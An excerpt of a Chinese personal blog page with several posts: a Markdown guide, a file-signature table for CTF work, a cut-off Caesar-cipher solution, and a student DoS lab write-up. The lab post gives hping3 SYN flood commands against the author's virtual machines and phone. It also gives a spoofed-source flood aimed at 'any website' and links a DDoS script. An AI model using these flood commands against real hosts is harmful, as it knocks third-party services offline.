+      <a data-url="http://example.com/2019/10/19/hping3%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%BD%AC%EF%BC%89/" data-id="cl1qb1dyk004bqktugxybhxcr" data-title="hping3命令详解（转）" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" rel="tag">拒绝服务攻击</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-拒绝服务攻击（DoS攻击）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/19/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DoS%E6%94%BB%E5%87%BB%EF%BC%89/" class="article-date">
+  <time class="dt-published" datetime="2019-10-18T17:27:46.000Z" itemprop="datePublished">2019-10-19</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/10/19/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DoS%E6%94%BB%E5%87%BB%EF%BC%89/">拒绝服务攻击（DoS攻击）</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>前几天网安老师给我们几个留了个作业，让我们进行DoS攻击自己的虚拟机，但是想自己玩点有意思的东西，所以就在作业的基础上加了一点东西(#^.^#)(#^.^#)</p>
+<h1 id="具体实验"><a href="#具体实验" class="headerlink" title="具体实验"></a>具体实验</h1><h2 id="1-利用kali自带的hping3进行DoS实验"><a href="#1-利用kali自带的hping3进行DoS实验" class="headerlink" title="1 利用kali自带的hping3进行DoS实验"></a>1 利用kali自带的hping3进行DoS实验</h2><h3 id="1-1-Windows-10"><a href="#1-1-Windows-10" class="headerlink" title="1.1 Windows 10"></a>1.1 Windows 10</h3><p>在kali的命令行中输入下面命令并回车</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -V -c 10000 -d 120 -S -A -w 64 --keep -p 80 -s 80 --flood -a 192.168.43.110 192.168.43.148</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191019163236347.png" alt="图1 kali攻击win10"></p>
+<p>经过一段时间后，win10的CPU占用率为100%</p>
+<p><img src="https://img-blog.csdnimg.cn/2019101916444530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图2 win10被攻击情况"></p>
+<h3 id="1-2-Windows-7"><a href="#1-2-Windows-7" class="headerlink" title="1.2 Windows 7"></a>1.2 Windows 7</h3><p>在kali的命令行中输入下面命令并回车</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -V -c 10000 -d 120 -S -A -w 64 --keep -p 80 -s 80 --flood -a 192.168.43.110 192.168.43.87</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20191019163918997.png" alt="图3 kali攻击win7"></p>
+<p>经过一段时间后，win7的CPU占用率为100%</p>
+<p><img src="https://img-blog.csdnimg.cn/2019101916364152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图4 win7被攻击情况"></p>
+<h3 id="1-3-Windows-XP"><a href="#1-3-Windows-XP" class="headerlink" title="1.3 Windows XP"></a>1.3 Windows XP</h3><p>在kali的命令行中输入下面命令并回车</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -V -c 10000 -d 120 -S -A -w 64 --keep -p 80 -s 80 --flood -a 192.168.43.110 192.168.43.116</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191019163846660.png" alt="图5 kali攻击XP"></p>
+<p>经过一段时间后，XP的CPU占用率为100%</p>
+<p><img src="https://img-blog.csdnimg.cn/20191019163732928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图6 XP被攻击情况"></p>
+<h3 id="1-4-Android"><a href="#1-4-Android" class="headerlink" title="1.4 Android"></a>1.4 Android</h3><p>想了想，试试对自己的安卓手机进行DoS吧，应该不会有啥问题，大不了就恢复出厂设置，于是就在kali的命令行中运行下面命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -S --flood -V 117.136.66.249</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20191019175305298.png" alt="图7 kali攻击Android"></p>
+<p>没被攻击前，我的网络传输速率也就是46.5k&#x2F;s</p>
+<p><img src="https://img-blog.csdnimg.cn/20191019175132479.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图8 Android被攻击前"></p>
+<p>经过DoS一段时间后，Android的网络下载速率达到2.5M&#x2F;s，拿到较高数据后就立马停止攻击了</p>
+<p><img src="https://img-blog.csdnimg.cn/20191019175339403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图9 Android被攻击后"></p>
+<h3 id="1-5-对某个网站进行搞破坏"><a href="#1-5-对某个网站进行搞破坏" class="headerlink" title="1.5 对某个网站进行搞破坏"></a>1.5 对某个网站进行搞破坏</h3><p>目标主机是任意一个主机名或者ip地址，攻击代码如下所示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -S --flood -rand--source -p 80 [hostname/ip]</span><br></pre></td></tr></table></figure>
+<p>命令解释如下</p>
+<ul>
+<li>-S 表示发送的是SYN包。<br>这里涉及到TCP的三次握手，客户端与服务器要建立连接，首先要先由客户端向发服务器发送一个SYN包请求连接，服务器收到客户端发来的SYN包后会回复一个SYN+ACK包表示可以进行连接，之后客户端再发送一个SYN+ACK包，当这个包发送完成之后，客户端和服务器的连接就算成功了。因此，这个参数导致的结果时向服务器发送SYN包却不对返回的SYN+ACK包进行回应，使服务器保持在一种”半连接”在状态</li>
+<li>–flood 表示以洪水的方式发送，就是拼了命地发</li>
+<li>-rand–source 是指定随机来源，意思是假装有很多台主机要和服务器连接，实际上这些主机IP都是伪造的</li>
+<li>-p 80 指定端口号为80</li>
+<li>[hostname&#x2F;ip] 目标服务器的主机名或是IP地址</li>
+</ul>
+<h2 id="2-利用https-github-com-Ha3MrX-DDos-Attack中的脚本进行DoS攻击"><a href="#2-利用https-github-com-Ha3MrX-DDos-Attack中的脚本进行DoS攻击" class="headerlink" title="2 利用https://github.com/Ha3MrX/DDos-Attack中的脚本进行DoS攻击"></a>2 利用<a href="">https://github.com/Ha3MrX/DDos-Attack</a>中的脚本进行DoS攻击</h2><p>下面是网络安全课堂上讲的那个在<a href="">https://github.com/Ha3MrX/DDos-Attack</a>上clone并进行攻击的例子。<br>利用上面的python代码攻击XP的过程及效果如下所示，win7和win10的效果类似，这里不予赘述。</p>
+<p>在Kali中扫描XP开放的端口，此处发现135、139、445、3389端口均开放</p>
+<p><img src="https://img-blog.csdnimg.cn/20191020005621450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图10 nmap扫描XP开放端口"></p>
+<p>此处我们利用ip地址192.168.43.116和端口445</p>
+<p><img src="https://img-blog.csdnimg.cn/20191020005650815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图11 设置攻击ip和port"></p>
+<p>经过一段时间后，XP的CPU占用率为100%</p>
+<p><img src="https://img-blog.csdnimg.cn/20191020005718564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图12 kali开始攻击"></p>
+<p><img src="https://img-blog.csdnimg.cn/20191020005738159.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="图13 XP攻击的效果"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>有关hping3的命令介绍见我下面的这篇文章<br><a target="_blank" rel="noopener" href="https://xingshuaikun.gitee.io/2019/10/19/hping3%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%BD%AC%EF%BC%89/">https://xingshuaikun.gitee.io/2019/10/19/hping3%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E8%BD%AC%EF%BC%89/</a></p>
+<p>其实从严格意义上来说，上面的内容只是DoS,并不算DDOS，很明显没有第一个D—分布式，但是，DDOS的基础就是DOS啊，当发起攻击的主机足够多时候，DOS就演变成DDOS了</p>
+<p>本人创作此博客仅做学习交流之用，希望大家不要将其用于现实环境中，当然，也请各位大哥大姐们别滴我啊，谢谢合作……</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/19/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DoS%E6%94%BB%E5%87%BB%EF%BC%89/" data-id="cl1qb1dzn0071qktuay25c550" data-title="拒绝服务攻击（DoS攻击）" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" rel="tag">拒绝服务攻击</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Markdown基本语法" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/18/Markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/" class="article-date">
+  <time class="dt-published" datetime="2019-10-18T14:03:10.000Z" itemprop="datePublished">2019-10-18</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BB%8F%E9%AA%8C/">经验</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/10/18/Markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/">Markdown基本语法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>前两天搭建了自己的github博客，于是开始总结一下markdown语法，以便自己以后可以以多种形式表达自己的想法！！！</p>
+<h2 id="1-快捷键"><a href="#1-快捷键" class="headerlink" title="1 快捷键"></a>1 快捷键</h2><hr>
+<p>撤销：Ctrl&#x2F;Command + Z<br>重做：Ctrl&#x2F;Command + Y<br>加粗：Ctrl&#x2F;Command + B<br>斜体：Ctrl&#x2F;Command + I<br>标题：Ctrl&#x2F;Command + Shift + H<br>无序列表：Ctrl&#x2F;Command + Shift + U<br>有序列表：Ctrl&#x2F;Command + Shift + O<br>检查列表：Ctrl&#x2F;Command + Shift + C<br>插入代码：Ctrl&#x2F;Command + Shift + K<br>插入链接：Ctrl&#x2F;Command + Shift + L<br>插入图片：Ctrl&#x2F;Command + Shift + G<br>查找：Command + F<br>替换：Command + G</p>
+<h2 id="2-标题"><a href="#2-标题" class="headerlink" title="2 标题"></a>2 标题</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><p><img src="https://img-blog.csdnimg.cn/20191018220838233.png"></p>
+<h3 id="语法效果"><a href="#语法效果" class="headerlink" title="语法效果"></a>语法效果</h3><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><h2 id="3-文本样式"><a href="#3-文本样式" class="headerlink" title="3 文本样式"></a>3 文本样式</h2><h3 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h3><p><img src="https://img-blog.csdnimg.cn/20191018221902984.png"></p>
+<h3 id="语法效果-1"><a href="#语法效果-1" class="headerlink" title="语法效果"></a>语法效果</h3><p><em>强调文本</em> <em>强调文本</em></p>
+<p><strong>加粗文本</strong> <strong>加粗文本</strong></p>
+<p><del>删除文本</del></p>
+<blockquote>
+<p>引用文本</p>
+</blockquote>
+<h2 id="4-列表"><a href="#4-列表" class="headerlink" title="4 列表"></a>4 列表</h2><h3 id="基本语法-2"><a href="#基本语法-2" class="headerlink" title="基本语法"></a>基本语法</h3><p><img src="https://img-blog.csdnimg.cn/20191018222219433.png"></p>
+<h3 id="语法效果-2"><a href="#语法效果-2" class="headerlink" title="语法效果"></a>语法效果</h3><ul>
+<li>项目<ul>
+<li>项目<ul>
+<li>项目</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ol>
+<li>项目1</li>
+<li>项目2</li>
+<li>项目3</li>
+</ol>
+<ul>
+<li><input disabled="" type="checkbox"> 计划任务</li>
+<li><input checked="" disabled="" type="checkbox"> 完成任务</li>
+</ul>
+<h2 id="5-链接"><a href="#5-链接" class="headerlink" title="5 链接"></a>5 链接</h2><h3 id="基本语法-3"><a href="#基本语法-3" class="headerlink" title="基本语法"></a>基本语法</h3><p><img src="https://img-blog.csdnimg.cn/20191018222445985.png"></p>
+<h3 id="语法效果-3"><a href="#语法效果-3" class="headerlink" title="语法效果"></a>语法效果</h3><p>链接: <a target="_blank" rel="noopener" href="https://mp.csdn.net/">link</a>.</p>
+<p>图片: <img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9hdmF0YXIuY3Nkbi5uZXQvNy83L0IvMV9yYWxmX2h4MTYzY29tLmpwZw" alt="demo"></p>
+<h2 id="6-代码片"><a href="#6-代码片" class="headerlink" title="6 代码片"></a>6 代码片</h2><h3 id="基本语法-4"><a href="#基本语法-4" class="headerlink" title="基本语法"></a>基本语法</h3><p><img src="https://img-blog.csdnimg.cn/20191018222728373.png"></p>
+<h3 id="语法效果-4"><a href="#语法效果-4" class="headerlink" title="语法效果"></a>语法效果</h3><p>下面展示一些 <code>内联代码片</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// A code block</span><br><span class="line">var foo = &#x27;bar&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-表格"><a href="#4-表格" class="headerlink" title="4 表格"></a>4 表格</h2><h3 id="基本语法-5"><a href="#基本语法-5" class="headerlink" title="基本语法"></a>基本语法</h3><p><img src="https://img-blog.csdnimg.cn/20191018222912300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70"></p>
+<h3 id="语法效果-5"><a href="#语法效果-5" class="headerlink" title="语法效果"></a>语法效果</h3><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>电脑</td>
+<td>$1600</td>
+</tr>
+<tr>
+<td>手机</td>
+<td>$12</td>
+</tr>
+<tr>
+<td>导管</td>
+<td>$1</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">Column 1</th>
+<th align="right">Column 2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">centered 文本居中</td>
+<td align="right">right-aligned 文本居右</td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/18/Markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/" data-id="cl1qb1dya003kqktu4fluhxzy" data-title="Markdown基本语法" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BB%8F%E9%AA%8C/" rel="tag">经验</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-常见文件文件头文件尾格式总结及各类文件头" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/18/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%96%87%E4%BB%B6%E5%A4%B4%E6%96%87%E4%BB%B6%E5%B0%BE%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93%E5%8F%8A%E5%90%84%E7%B1%BB%E6%96%87%E4%BB%B6%E5%A4%B4/" class="article-date">
+  <time class="dt-published" datetime="2019-10-18T10:53:49.000Z" itemprop="datePublished">2019-10-18</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%BB%8F%E9%AA%8C/">经验</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/10/18/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%96%87%E4%BB%B6%E5%A4%B4%E6%96%87%E4%BB%B6%E5%B0%BE%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93%E5%8F%8A%E5%90%84%E7%B1%BB%E6%96%87%E4%BB%B6%E5%A4%B4/">常见文件文件头文件尾格式总结及各类文件头</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>最近做了嘶吼的CTF题目，里面有道题叫黄金6年，这个 mp4 文件中隐藏着一个 rar 压缩包，因为不知道文件头，所以就没做出来，所以这次总结了个表，方便自己以后来查表。</p>
+<h1 id="2-表格"><a href="#2-表格" class="headerlink" title="2 表格"></a>2 表格</h1><table>
+<thead>
+<tr>
+<th>文件格式</th>
+<th>文件头</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JPEG (jpg)</td>
+<td>FFD8FF</td>
+</tr>
+<tr>
+<td>PNG (png)</td>
+<td>89504E47</td>
+</tr>
+<tr>
+<td>GIF (gif)</td>
+<td>47494638</td>
+</tr>
+<tr>
+<td>TIFF (tif)</td>
+<td>49492A00</td>
+</tr>
+<tr>
+<td>Windows Bitmap (bmp)</td>
+<td>424D</td>
+</tr>
+<tr>
+<td>CAD (dwg)</td>
+<td>41433130</td>
+</tr>
+<tr>
+<td>Adobe Photoshop (psd)</td>
+<td>38425053</td>
+</tr>
+<tr>
+<td>Rich Text Format (rtf)</td>
+<td>7B5C727466</td>
+</tr>
+<tr>
+<td>XML (xml)</td>
+<td>3C3F786D6C</td>
+</tr>
+<tr>
+<td>HTML (html)</td>
+<td>68746D6C3E</td>
+</tr>
+<tr>
+<td>Email(eml)</td>
+<td>44656C69766572792D646174653A</td>
+</tr>
+<tr>
+<td>Outlook Express (dbx)</td>
+<td>CFAD12FEC5FD746F</td>
+</tr>
+<tr>
+<td>Outlook (pst)</td>
+<td>2142444E</td>
+</tr>
+<tr>
+<td>MS Word&#x2F;Excel (xls.or.doc)</td>
+<td>D0CF11E0</td>
+</tr>
+<tr>
+<td>MS Access (mdb)</td>
+<td>5374616E64617264204A</td>
+</tr>
+<tr>
+<td>WordPerfect (wpd)</td>
+<td>FF575043</td>
+</tr>
+<tr>
+<td>Adobe Acrobat (pdf)</td>
+<td>255044462D312E</td>
+</tr>
+<tr>
+<td>Quicken (qdf)</td>
+<td>AC9EBD8F</td>
+</tr>
+<tr>
+<td>Windows Password (pwl)</td>
+<td>E3828596</td>
+</tr>
+<tr>
+<td>ZIP Archive (zip)</td>
+<td>504B0304</td>
+</tr>
+<tr>
+<td>RAR Archive (rar)</td>
+<td>52617221</td>
+</tr>
+<tr>
+<td>Wave (wav)</td>
+<td>57415645</td>
+</tr>
+<tr>
+<td>AVI (avi)</td>
+<td>41564920</td>
+</tr>
+<tr>
+<td>Real Audio (ram)</td>
+<td>2E7261FD</td>
+</tr>
+<tr>
+<td>Real Media (rm)</td>
+<td>2E524D46</td>
+</tr>
+<tr>
+<td>MPEG (mpg)</td>
+<td>000001BA</td>
+</tr>
+<tr>
+<td>MPEG (mpg)</td>
+<td>000001B3</td>
+</tr>
+<tr>
+<td>Quicktime (mov)</td>
+<td>6D6F6F76</td>
+</tr>
+<tr>
+<td>Windows Media (asf)</td>
+<td>3026B2758E66CF11</td>
+</tr>
+<tr>
+<td>MIDI (mid)</td>
+<td>4D546864</td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/18/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%96%87%E4%BB%B6%E5%A4%B4%E6%96%87%E4%BB%B6%E5%B0%BE%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93%E5%8F%8A%E5%90%84%E7%B1%BB%E6%96%87%E4%BB%B6%E5%A4%B4/" data-id="cl1qb1dzl006xqktuev5e7e3g" data-title="常见文件文件头文件尾格式总结及各类文件头" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BB%8F%E9%AA%8C/" rel="tag">经验</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-CUMTOJ算法实验作业" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/16/CUMTOJ%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E4%BD%9C%E4%B8%9A/" class="article-date">
+  <time class="dt-published" datetime="2019-10-16T12:45:46.000Z" itemprop="datePublished">2019-10-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/10/16/CUMTOJ%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E4%BD%9C%E4%B8%9A/">CUMTOJ算法实验作业</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="问题-A-凯撒加密法"><a href="#问题-A-凯撒加密法" class="headerlink" title="问题 A: 凯撒加密法"></a>问题 A: 凯撒加密法</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p> 凯撒加密法，或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。<br>例如，当偏移量是左移3的时候：<br>明文字母表：ABCDEFGHIJKLMNOPQRSTUVWXYZ<br>密文字母表：DEFGHIJKLMNOPQRSTUVWXYZABC<br>使用时，加密者查找明文字母表中需要加密的消息中的每一个字母所在位置，并且写下密文字母表中对应的字母。需要解密的人则根据事先已知的密钥反过来操作，得到原来的明文。例如：<br>明文：THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG<br>密文：WKH TXLFN EURZQ IRA MXPSV RYHU WKH ODCB GRJ<br>现在给定你一个字符串S（长度不会超过1000000）和一个整数k（-1000000000&lt;&#x3D;k&lt;&#x3D;1000000000），分别代表接受者收到的密文和在加密该密文时向后的偏移量，你的任务是计算出原来的明文<br>注意：只有字母在加密时才会发生偏移，其它字符保持不变</p>
+<h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p> 输入包含多组数据，其中第一行为数据组数T（T&lt;&#x3D;10）<br>每组数据第一行为一个字符串S，由数字、字母以及常见字符组成（不含空格），第二行为一个整数k代表加密时向后的偏移量（|S|&lt;&#x3D;1000000,-1000000000&lt;&#x3D;k&lt;&#x3D;1000000000）</p>
+<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>对每组数据，输出一行字符串，代表输入中的密文对应的明文。</p>
+<h2 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h2><blockquote>
+<p>1<br>DEFGHIJKLMNOPQRSTUVWXYZABC<br>3</p>
+</blockquote>
+<h2 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h2><blockquote>
+<p>ABCDEFGHIJKLMNOPQRSTUVWXYZ</p>
+</blockquote>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>此题就是将输入的字符串传到string类型的变量str中，然后对数组进行操作即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str[i][j] = &#x27;A&#x27; + (str[i][j] - &#x27;A&#x27; - offset[i] + 26) % 26;</span><br></pre></td></tr></table></figure>
+
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">const int max_num = 10;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int i, j, T;</span><br><span class="line">    string str[max_num];</span><br><span class="line">    int offset[max_num];</span><br><span class="line">    cin &gt;&gt; T;</span><br><span class="line">    for(i = 0; i &lt; T; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; str[i];</span><br><span class="line">        cin &gt;&gt; offset[i];</span><br><span class="line">        offset[i] %= 26;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i = 0; i &lt; T; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j = 0; j &lt; str[i].length(); j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(str[i][j] &gt;= &#x27;A&#x27; &amp;&amp; str[i][j] &lt;= &#x27;Z&#x27;)</span><br><span class="line">                str[i][j] = &#x27;A&#x27; + (str[i][j] - &#x27;A&#x27; - offset[i] + 26) % 26;</span><br><span class="line">            else if(str[i][j] &gt;= &#x27;a&#x27; &amp;&amp; str[i][j] &lt;= &#x27;z&#x27;)</span><br><span class="line">                str[i][j] = &#x27;a&#x27; + (str[i][j] - &#x27;a&#x27; - offset[i] + 26) % 26;</span><br><span class="line">        